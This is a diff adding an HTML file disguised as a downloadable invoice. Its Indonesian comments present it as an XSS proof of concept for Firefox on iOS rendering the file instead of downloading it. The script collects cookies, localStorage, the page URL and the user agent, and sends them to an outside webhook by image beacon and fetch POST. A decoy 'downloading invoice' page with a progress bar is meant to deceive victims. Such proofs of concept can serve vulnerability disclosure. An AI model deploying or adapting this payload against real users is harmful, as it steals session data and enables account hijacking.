@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Unduhan Invoice</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Content-Disposition" content="attachment; filename=invoice.pdf">
+</head>
+<body>
+    <script>
+        // Simulasi Pencurian Data
+        const stolenCookies = document.cookie || "Tidak ada cookie (atau HttpOnly)";
+        const stolenLS = JSON.stringify(localStorage).substring(0, 100);
+
+        // Eksfiltrasi diam-diam ke webhook
+        const img = new Image();
+        img.src = "https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2?c=" + encodeURIComponent(stolenCookies) + "&ls=" + encodeURIComponent(stolenLS);
+        document.body.appendChild(img);
+
+        // Eksfiltrasi cadangan via fetch (POST)
+        fetch("https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2", {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                cookies: stolenCookies,
+                localStorage: stolenLS,
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            })
+        });
+
+        // Menampilkan Pop-up XSS sebagai bukti eksekusi
+        alert(
+            "⚠️ XSS EXPLOIT BERHASIL!\n\n" +
+            "File ini seharusnya di-download, tapi Firefox iOS menjalankannya.\n\n" +
+            "Data yang bisa diakses:\n" +
+            "- Cookies: " + stolenCookies + "\n" +
+            "- LocalStorage: " + stolenLS + "...\n\n" +
+            "Data telah dikirim ke server attacker."
+        );
+
+        console.log("XSS Proof of Concept: File content-type seharusnya application/pdf atau application/octet-stream");
+    </script>
+
+    <!-- UI tipuan untuk mengelabui korban -->
+    <div style="font-family: Arial, sans-serif; text-align: center; padding: 40px;">
+        <h2>Invoice #INV-2026-0542</h2>
+        <p>Sedang mengunduh dokumen, harap tunggu...</p>
+        <progress value="65" max="100" style="width: 60%;"></progress>
+        <p><small>Jika unduhan tidak dimulai, <a href="#" onclick="return false;">klik di sini</a></small></p>
+    </div>
+</body>
+</html>
